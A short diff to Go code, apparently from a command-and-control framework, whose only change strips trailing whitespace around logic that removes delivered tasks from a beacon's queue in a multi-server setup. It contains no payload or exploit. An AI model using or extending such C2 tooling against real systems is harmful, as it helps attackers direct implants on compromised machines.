@@ -1735,7 +1735,7 @@ func (c2 *C2Manager) UpdateTaskStatusFromMaster(masterTaskID, status string) {
 		oldStatus := task.Status
 		task.Status = status
 
-		// If task is no longer pending (sent/completed/failed by another server), 
+		// If task is no longer pending (sent/completed/failed by another server),
 		// remove from beacon's TaskQueue to prevent duplicate delivery
 		if oldStatus == "pending" && (status == "sent" || status == "completed" || status == "failed") {
 			if beacon, ok := c2.beacons[task.BeaconID]; ok {
@@ -1749,7 +1749,7 @@ func (c2 *C2Manager) UpdateTaskStatusFromMaster(masterTaskID, status string) {
 				if len(newQueue) != len(beacon.TaskQueue) {
 					beacon.TaskQueue = newQueue
 					if c2.debug {
-						logf("[C2] Removed task %s from beacon %s queue (status: %s, delivered by another server)", 
+						logf("[C2] Removed task %s from beacon %s queue (status: %s, delivered by another server)",
 							localTaskID, task.BeaconID, status)
 					}
 				}
